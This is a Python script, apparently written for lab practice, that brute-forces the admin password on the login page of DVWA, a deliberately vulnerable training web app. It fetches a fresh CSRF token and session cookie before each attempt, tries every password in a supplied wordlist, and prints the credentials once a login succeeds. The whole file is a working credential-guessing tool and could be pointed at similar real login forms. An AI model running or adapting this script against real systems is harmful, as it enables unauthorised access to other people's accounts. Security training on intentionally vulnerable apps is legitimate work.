#!/usr/bin/env python3

############### Samuel's Script ###############
## Created by Samuel PAGES | 14 Dec 2023
## Find password login page of DVWA
###############################################

import sys
import re
import argparse
import requests
from colorama import Fore, Style

# Info message
def infotext(msg) -> str:
    '''Display informational message on console in Blue
    Arguments:
    msg -- text to be printed
    '''
    print(f"{Fore.BLUE}[i] {msg}{Style.RESET_ALL}")

# Error message
def errortext(msg) -> str:
    '''Display success message on console in Red.
    Arguments:
    msg -- text to be printed
    '''
    print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")

# Warning message
def warntext(msg) -> str:
    '''Display success message on console in Yellow.
    Arguments:
    msg -- text to be printed
    '''
    print(f"{Fore.YELLOW}[~] {msg}{Style.RESET_ALL}")

# Success message
def successtext(msg) -> str:
    '''Display success message on console in Green.
    Arguments:
    msg -- text to be printed
    '''
    print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")

def get_user_token(body):
    '''Get user token
        Arguments:
        body -- Content of a token request
    '''
    match = re.search("user_token\\\' value=\\\'(.+)\\\'", body)
    if match:
        return match.group(1)
    else:
        return None 

def get_phpsessid(headers):
    '''Get PHP session ID
        Arguments:
        headers -- Header for the request
    '''
    set_cookie_header = headers.get('Set-Cookie')
    if set_cookie_header:
        return set_cookie_header.split(';')[0].split('=')[1]
    else:
        return None

def set_request_tokens(ip, cookies, data):
    '''Set Request Token
        Arguments:
        ip -- The IP of the DVWA
        cookie -- The Cookie of the session
        data -- The default data 
    '''
    response = requests.get(f'http://{ip}/login.php', timeout=300)
    cookies['PHPSESSID'] = get_phpsessid(headers=response.headers)
    data['user_token'] = get_user_token(body=response.content.decode('UTF-8'))

def brute_force(ip, headers, cookies, data, file_path, verbose, vverbose):
    '''Starts a brute force attack on the login page of DVWA.
        Arguments:
        ip -- The IP of the DVWA
        cookie -- The Cookie of the session
        data -- The default data 
        file_path -- The full path of the file that contains possible passwords
        verbose -- Get more info
    '''
    try:
        if verbose or vverbose:
            infotext(f"All verbosed info : \nCookies : {cookies}\nHeaders : {headers}")
        with open(file_path, 'r',encoding='utf-8') as file:
            file_contents = [line.strip() for line in file]
        for password in file_contents:
            set_request_tokens(ip, cookies, data)
            data['password'] = password
            if verbose or vverbose:
                infotext(f"Trying with : {password}")
            response = requests.post(f'http://{ip}/login.php', cookies=cookies, headers=headers, data=data, timeout=300)
            if vverbose:
                infotext(response.content)
            if 'Login failed' in response.content.decode('UTF-8'):
                continue
            elif 'You have logged in as ' in response.content.decode('UTF-8'):
                successtext("=================")
                successtext("Successful Login!")
                successtext("Credential Found:")
                successtext(f"- Username: {data['username']}")
                successtext(f"- Password: {data['password']}")
                successtext("=================")
                if vverbose:
                    infotext("Exit_code : 0")
                sys.exit(0) # Stop Script Without Error
    except FileNotFoundError:
        errortext(f"File not found: {file_path}")
    except Exception as e:
        errortext(f"An error occurred: {e}")

def main(web_ip, file_path, php_session_id, http, https, verbose, vverbose):
    '''
        Does everything
    '''
    if http and https:
        errortext("You cannot use --https and --http, choose one")
        if vverbose:
            infotext("Exit_code : 1")
        sys.exit(1) # Stop Script
    if not http and not https:
        errortext("You have to use --https or --http, choose one")
        if vverbose:
            infotext("Exit_code : 1")
        sys.exit(1) # Stop Script
    # Define variables
    cookies = {
        'PHPSESSID': f'{php_session_id}',
        'security': 'low',
    }
    if http:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Origin': 'http://localhost',
            'Referer': f'http://{web_ip}/login.php',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'dnt': '1',
        }
    else:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Origin': 'http://localhost',
            'Referer': f'https://{web_ip}/login.php',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'dnt': '1',
        }
    data = {
        'username': 'admin',
        'password': '123',
        'Login': 'Login',
        'user_token': 'e877712995a1d2bbae4c622fff7f9b9a',
    }
    
    brute_force(web_ip, headers, cookies, data, file_path, verbose, vverbose)


if __name__ == "__main__":
    # Parameters
    parser = argparse.ArgumentParser(description='Find password login page of DVWA (https://github.com/digininja/DVWA)')
    parser.add_argument('-ip', '--web-ip', action="store", type=str, required=True, help='Enter IP adress or DNS name of the machine')
    parser.add_argument('-f', '--file-path', action="store", type=str, required=True, help='Enter full path of the file that contains possible passwords')
    parser.add_argument('-id', '--php-session-id', action="store", type=str, required=True, help='Enter the PHPSESSID from cookies')
    parser.add_argument('--http', action="store_true", required=False, help='To enable http')
    parser.add_argument('--https', action="store_true", required=False, help='To enable https')
    parser.add_argument('-v', '--verbose', action="store_true", required=False, help='Get more info')
    parser.add_argument('-vv', '--vverbose', action="store_true", required=False, help='Get more than more info')
    args = parser.parse_args()
    
    main(args.web_ip, args.file_path, args.php_session_id, args.http, args.https, args.verbose, args.vverbose)
